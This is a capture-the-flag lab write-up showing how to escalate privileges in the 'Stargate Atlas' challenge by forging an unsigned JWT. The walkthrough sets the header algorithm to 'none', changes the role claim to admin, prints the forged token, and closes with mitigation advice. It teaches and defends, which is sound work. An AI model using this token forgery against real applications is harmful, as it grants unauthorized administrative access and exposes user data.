---
title: "Privilege Escalation – JWT None Algorithm Abuse | Stargate Atlas"
date: 2026-05-29 00:00:00 +0530
categories: [A01 - Broken Access Control, Privilege Escalation]
tags: [webversepro, jwt, privilege-escalation, broken-access-control, jwt-none, token-tampering]
author: Shivansh Sharma
image:
path: /assets/images/posts/stargate-atlas-jwt-privilege-escalation.webp
alt: Privilege Escalation – JWT None Algorithm Abuse | Stargate Atlas
---------------------------------------------------------------------

## Lab Link

Lab: [Stargate Atlas](https://dashboard.webverselabs-pro.com/challenges/unsealed)

---

## Overview

Stargate Atlas is a spaceflight-tracking platform that provides launch schedules, mission archives, and subscriber-only telemetry data.

The application uses a custom JWT-based authentication mechanism. While JWTs are designed to provide integrity protection through cryptographic signatures, the application incorrectly accepts tokens using the `none` algorithm.

Because signature verification can be bypassed, an attacker can forge arbitrary JWTs and assign themselves administrative privileges.

This allows unauthorized access to administrative functionality and sensitive resources.

---

## Objective

Abuse the JWT implementation to obtain administrator privileges and access the protected manifests section.

---

## Vulnerability Identification

This challenge is primarily a Privilege Escalation vulnerability.

### Classification Hierarchy

A01 - Broken Access Control
└── Authorization Failure
└── Client-Controlled Authorization
└── Privilege Escalation via JWT Forgery

---

## Reconnaissance

Register a new account:

```text
https://8bf1e8ae-4065-unsealed-689de.challenges.webverselabs-pro.com/register
```

After registration, inspect the authentication cookie using:

* Browser Developer Tools
* Burp Suite
* JWT decoding tools

The cookie is identified as a JSON Web Token (JWT).

---

## Exploitation

### Step 1 - Decode the JWT

The token contains the following header:

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

Payload:

```json
{
  "sub": "kelvin@kel.com",
  "role": "subscriber",
  "iat": 1779173569,
  "exp": 1779177169
}
```

The payload reveals that authorization is based on the `role` claim.

Current privilege level:

```text
subscriber
```

---

### Step 2 - Test Signature Validation

JWT implementations should reject unsigned tokens and require signature verification.

Modify the header:

```json
{
  "alg": "none",
  "typ": "JWT"
}
```

This instructs vulnerable JWT implementations to skip signature validation entirely.

---

### Step 3 - Escalate Privileges

Modify the payload role:

Original:

```json
{
  "role": "subscriber"
}
```

Modified:

```json
{
  "role": "admin"
}
```

Resulting payload:

```json
{
  "sub": "kelvin@kel.com",
  "role": "admin",
  "iat": 1779173569,
  "exp": 1779177169
}
```

---

### Step 4 - Forge the Token

Construct a JWT using the modified header and payload.

Forged token:

```text
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJrZWx2aW5Aa2VsLmNvbSIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc3OTE3MzU2OSwiZXhwIjoxNzc5MTc3MTY5fQ.
```

Notice the empty signature section at the end.

The application incorrectly accepts this token.

---

### Step 5 - Replace the Cookie

Using Developer Tools or Burp Suite, replace the original JWT with the forged token.

Refresh the application.

The interface now exposes administrator functionality.

This confirms that the server trusts the modified JWT without verifying its integrity.

---

### Step 6 - Access the Administrative Area

Navigate to:

```text
https://8bf1e8ae-4065-unsealed-689de.challenges.webverselabs-pro.com/admin/manifests
```

The page is now accessible with administrative privileges.

The flag is available within the administrative section.

```text
WEBVERSE{.....}
```

---

## Proof of Exploitation

### Original JWT Header

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

### Modified JWT Header

```json
{
  "alg": "none",
  "typ": "JWT"
}
```

### Original Role

```json
{
  "role": "subscriber"
}
```

### Modified Role

```json
{
  "role": "admin"
}
```

### Forged Token

```text
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJrZWx2aW5Aa2VsLmNvbSIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc3OTE3MzU2OSwiZXhwIjoxNzc5MTc3MTY5fQ.
```

### Administrative Endpoint

```text
/admin/manifests
```

### Flag

```text
WEBVERSE{.....}
```

---

## Impact

An attacker can:

* Forge authentication tokens.
* Escalate privileges.
* Access administrative functionality.
* Bypass authorization controls.
* Access sensitive operational data.
* Compromise the entire application trust model.

In a real platform this could expose:

* Internal launch schedules
* Subscriber data
* Administrative controls
* Operational infrastructure
* Sensitive telemetry information

---

## Mitigation

### Reject `alg: none`

Production JWT implementations should never accept unsigned tokens.

### Enforce Signature Verification

Every JWT must have a valid cryptographic signature before claims are trusted.

### Explicitly Whitelist Algorithms

Accept only approved algorithms.

Example:

```text
HS256
RS256
ES256
```

### Never Trust Client Claims Without Validation

Authorization decisions should only be made after successful token verification.

### Use Mature JWT Libraries

Avoid custom authentication implementations whenever possible.

### Perform Security Testing

Validate that tokens cannot be modified to change:

```text
role
permissions
is_admin
groups
access_level
```

without invalidating the signature.

---

## Real-World Insight

The JWT `none` algorithm vulnerability became widely known after multiple implementations incorrectly trusted the algorithm specified inside the token itself.

Attackers could modify claims, remove signatures, and submit forged tokens that were accepted as valid.

While modern JWT libraries have largely addressed this issue, custom authentication implementations continue to reintroduce similar flaws.

The Stargate Atlas challenge demonstrates an important lesson:

**A JWT is only trustworthy if its signature is verified before any claim is trusted.**
